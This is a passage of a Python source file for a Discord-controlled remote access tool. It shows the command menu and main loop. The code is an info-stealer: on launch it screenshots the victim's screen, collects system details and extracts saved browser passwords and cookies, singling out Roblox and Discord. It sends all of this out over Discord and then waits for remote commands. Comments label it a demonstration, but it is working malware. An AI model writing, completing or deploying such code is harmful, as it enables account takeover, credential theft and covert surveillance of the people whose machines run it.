║ !cd <path> - Change current directory
║ !pwd - Show current directory
║ !ping - Check if the system is online
║ !uptime - Show system uptime
║ !sysload - Show current system load
║ !netstat - Show network connections
║ !users - Show logged in users
║ !cookies - Extract browser cookies (focus on Roblox, Discord)
║ !passwords - Extract saved browser passwords
║ !browser - Extract all browser data
║ !help - Show this help message
║ !exit - Stop the remote access client
╚═════════════════════════════════════════════════════════════════════╝
        """
        send_message(f"```{help_text}```", "info")
    
    elif command_name == "exit":
        send_message("Shutting down remote access client...", "exit")
        sys.exit(0)
    
    else:
        send_message(f"Unknown command: {command_name}. Type !help for available commands.", "error")

def main():
    """Main function to run the remote access client"""
    print(ASCII_ART)
    print(f"{platform.node()}")
    
    # Check for required packages
    try:
        import psutil
        import PIL
        from Crypto.Cipher import AES
        import win32crypt
    except ImportError as e:
        missing_package = str(e).split("'")[1]
        print(f"Error: Missing required package: {missing_package}")
        print("Please install the required packages with:")
        print("pip install psutil pillow pycryptodome pywin32")
        sys.exit(1)
    
    # Send initial connection message with fancy formatting
    send_message(f"Remote access client started on {platform.node()}", "success")
    
    # Take and send initial screenshot
    screenshot_bytes = take_screenshot()
    if screenshot_bytes:
        send_file(file_content=screenshot_bytes, file_name="initial_screenshot.png", content_type="image/png", message="📸 Initial screenshot")
    
    # Send system info
    system_info = get_detailed_system_info()
    if len(system_info) > 1900:
        chunks = [system_info[i:i+1900] for i in range(0, len(system_info), 1900)]
        for i, chunk in enumerate(chunks):
            send_message(f"```\nSystem Info ({i+1}/{len(chunks)}):\n{chunk}\n```", "system")
    else:
        send_message(f"```\n{system_info}\n```", "system")
    
    # Extract and send browser data
    send_message("Extracting browser data...", "info")
    browser_data = extract_browser_data()
    formatted_data = format_browser_data(browser_data)
    
    # Split long outputs into multiple messages if needed
    if len(formatted_data) > 1900:
        chunks = [formatted_data[i:i+1900] for i in range(0, len(formatted_data), 1900)]
        for i, chunk in enumerate(chunks):
            send_message(f"```\nBrowser Data ({i+1}/{len(chunks)}):\n{chunk}\n```", "info")
    else:
        send_message(f"```\n{formatted_data}\n```", "info")
    
    # Simple implementation - in a real scenario, you would use Discord's API properly
    # This is just a demonstration of the concept
    print("Listening for commands...")
    
    try:
        while True:
            # In a real implementation, you would use Discord's API to get messages
            # This is just a placeholder for demonstration purposes
            message = get_last_message()
            if message:
                process_command(message)
            time.sleep(CHECK_INTERVAL)
    except KeyboardInterrupt:
        print("Shutting down...")
        send_message("Remote access client stopped", "exit")
    except Exception as e:
        error_msg = f"Error in main loop: {e}"
        print(error_msg)
        send_message(error_msg, "error")
        
if __name__ == "__main__":
    main()
